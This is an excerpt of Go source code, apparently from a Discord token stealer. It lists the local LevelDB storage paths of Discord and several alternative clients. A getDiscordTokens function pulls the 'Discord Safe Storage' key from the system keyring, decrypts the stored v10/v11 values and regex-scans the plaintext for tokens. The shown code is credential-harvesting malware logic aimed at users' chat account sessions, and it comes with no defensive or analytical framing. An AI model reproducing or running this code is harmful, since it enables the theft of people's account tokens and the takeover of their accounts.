...
var leveldbLocations = []string{
	filepath.Join(appSupport, "discord", "Local Storage", "leveldb"),
	filepath.Join(appSupport, "discordcanary", "Local Storage", "leveldb"),
	filepath.Join(appSupport, "discordptb", "Local Storage", "leveldb"),
	filepath.Join(appSupport, "discorddevelopment", "Local Storage", "leveldb"),
	filepath.Join(appSupport, "vesktop", "session", "Local Storage", "leveldb"),
	filepath.Join(appSupport, "WebCord", "Local Storage", "leveldb"),
	filepath.Join(appSupport, "VencordDesktop", "Local Storage", "leveldb"),
}
...
func getDiscordTokens() []Discord {
	...
	key, _ := keyring.Get("Discord Safe Storage", "discord")
	...
	for iter.Next() {
		encrypted := iter.Value()
		if len(encrypted) < 31 || (!bytes.HasPrefix(encrypted, []byte("v10")) && !bytes.HasPrefix(encrypted, []byte("v11"))) {
			continue
		}
		...
		matches := re.FindAllString(string(plaintext), -1)
